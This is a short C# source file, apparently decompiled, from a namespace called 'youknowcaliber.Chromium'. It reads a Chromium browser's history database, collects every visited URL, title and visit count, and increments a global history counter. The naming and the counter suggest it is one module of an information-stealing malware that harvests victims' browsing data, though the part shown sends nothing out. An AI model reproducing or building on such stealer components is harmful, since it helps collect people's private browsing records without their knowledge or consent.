﻿using System;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
	internal sealed class History
	{
		public static List<Site> Get(string sHistory)
		{
			List<Site> result;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "urls");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site item = default(Site);
						item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
						Counting.History++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Site>();
			}
			return result;
		}
	}
}
